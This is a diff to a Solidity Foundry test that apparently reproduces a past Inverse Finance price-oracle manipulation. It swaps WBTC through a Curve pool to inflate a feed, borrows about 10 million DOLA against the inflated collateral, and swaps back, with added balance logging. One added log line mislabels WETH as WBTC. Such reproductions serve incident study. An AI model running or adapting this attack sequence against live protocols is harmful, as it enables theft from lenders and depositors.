@@ -8,6 +8,7 @@ import "./interface.sol";
 contract ContractTest is DSTest {
 
     IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
+    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     USDT usdt = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IERC20 DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
     ILendingPool  aaveLendingPool   = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
@@ -68,19 +69,26 @@ contract ContractTest is DSTest {
   Unitroller.enterMarkets(toEnter);
 
   emit log_named_int("YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
+  emit log_named_uint("Before swap, USDT balance of attacker:", usdt.balanceOf(address(this)));
+  emit log_named_uint("Before swap, WBTC balance of CRV3Pool:", WBTC.balanceOf(address(curveVyper_contract)));
+  emit log_named_uint("Before swap, WETH balance of CRV3Pool:", WETH.balanceOf(address(curveVyper_contract)));
+  emit log_named_uint("Before swap, USDT balance of CRV3Pool:", usdt.balanceOf(address(curveVyper_contract)));
   curveRegistry.exchange(address(curveVyper_contract),address(WBTC),address(usdt),2677500000000,0,address(this));
-  emit log_named_uint("After swapped, USDT balance of attacker:", usdt.balanceOf(address(this)));
+  emit log_named_uint("After swap, USDT balance of attacker:", usdt.balanceOf(address(this)));
+  emit log_named_uint("After swap, WBTC balance of CRV3Pool:", WBTC.balanceOf(address(curveVyper_contract)));
+  emit log_named_uint("After swap, WBTC balance of CRV3Pool:", WETH.balanceOf(address(curveVyper_contract)));
+  emit log_named_uint("After swap, USDT balance of CRV3Pool:", usdt.balanceOf(address(curveVyper_contract)));
   emit log_named_int("Manipulated YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
   InverseFinanceDola.borrow(10133949192393802606886848);
   emit log_named_uint("DOLA balance of attacker:", DOLA.balanceOf(address(this)));
   curveRegistry.exchange(address(curveVyper_contract),address(usdt),address(WBTC),75403376186072,0,address(this));
-  emit log_named_uint("After swapped, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
+  emit log_named_uint("After swap, WBTC balance of attacker:", WBTC.balanceOf(address(this))/1e8);
   curveRegistry.exchange(address(dola3pool3crv),address(DOLA),address(crv3),10133949192393802606886848,0,address(this));
-  emit log_named_uint("After swapped,3crv balance of attacker:", crv3.balanceOf(address(this)));
+  emit log_named_uint("After swap,3crv balance of attacker:", crv3.balanceOf(address(this)));
   curve3pool.remove_liquidity_one_coin(9881355040729892287779421,2,0);
-  emit log_named_uint("After swapped, USDT balance of attacker:", usdt.balanceOf(address(this)));
+  emit log_named_uint("After swap, USDT balance of attacker:", usdt.balanceOf(address(this)));
    curveRegistry.exchange(address(curveVyper_contract),address(usdt),address(WBTC),10000000000000,0,address(this));
-  emit log_named_uint("After swapped, WBTC balance of attacker:", WBTC.balanceOf(address(this))); 
+  emit log_named_uint("After swap, WBTC balance of attacker:", WBTC.balanceOf(address(this))); 
   WBTC.approve(address(aaveLendingPool),2702430000000);
   
   return true;
